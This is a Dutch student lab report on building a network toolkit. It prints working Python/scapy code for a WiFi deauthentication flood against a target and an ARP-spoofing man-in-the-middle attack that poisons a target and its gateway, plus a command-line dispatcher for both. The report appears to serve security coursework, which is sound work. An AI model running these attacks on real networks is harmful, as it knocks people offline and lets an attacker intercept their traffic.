## Verslag les 9

Tijdens dit labo heb ik aan mijn tookit gewerkt. Mijn toolkit heeft 2 kanten, een snif kant en een aanval kant. Er zijn 2 toevoegingen aan mijn aanval kant. Het is me gelukt om wifi deauth toe te voegen samen met een man in the middle

### Deauth

Met deze functie kun je 500 deauth frames sturen naar voor een ip adres. Merk op dat je best in monitor mode dit kunt doen.
```python
def deauth(ip: str):
    gws = netifaces.gateways()
    ip_gateway = gws["default"][2][0]
    print(ip_gateway, ip)

    mac_host = arp(ip)
    mac_gateway = arp(ip_gateway)
    print(mac_host, mac_gateway)

    dot11 = Dot11(addr1=mac_host, addr2=mac_gateway, addr3=mac_gateway)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.01, count=500 )#iface="wlan0mon", verbose=1)
    print(ping_host(ip))

```

### Man in the middle
Deze code maakt 2 sub processen aan die door te arpspoofen ervoor zorgen dat de default gateway en de target naar de host berichten gaan sturen.

```python
def mitm(target: str, gateway:str, host: str):
    print(target, gateway, host, "mitm")
    spawn_spoofer(target, gateway)
    spawn_spoofer(gateway, target)
    time.sleep(6)
    pass

def spawn_spoofer(targetIP, spoofIP):
    p = Process(target=loop_spoofer, args=(targetIP, spoofIP,))
    p.start()

def loop_spoofer(targetIP, spoofIP):
    print(f"starting spoofer {targetIP} -> {spoofIP}")
    destinationMac = arp(targetIP)
    while True:
        spoofer(targetIP, spoofIP, destinationMac)
        time.sleep(1)

def spoofer(targetIP, spoofIP, destinationMac):
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
    scapy.send(packet, verbose=False)

```

#### Main
momenteel ziet de main functie er zo uit.
Door gebruik te maken van de argparse module worden cmd argumenten geparsed.
```python
if __name__ == "__main__":
    args = get_arguments()

    # sniffen
    if args.scan:
        type_of_scan = args.scan

        # --scan layer2 --card en1
        if type_of_scan.lower() == "layer2" and args.card:
            interface = args.card
            print(f"scanning {type_of_scan} on {interface}")
            sniff_layer_2(interface)

        elif type_of_scan.lower() == "ping" and args.target:
            target = args.target

            print("pinging host(s)", target)
            if ping_host(target):
                print("Antwoord gekregen van {host}")
            else:
                print(f"geen antwoord gekregen van {target}")

    # attack
    elif args.attack:
        print("attack")
        attack = args.attack.lower()
        target = args.target
        gateway = args.gateway
        host = args.host

        if attack == "mitm" and target and gateway and host:
            mitm(target, gateway, host)
        elif attack == "deauth" and target:
            deauth(target)

```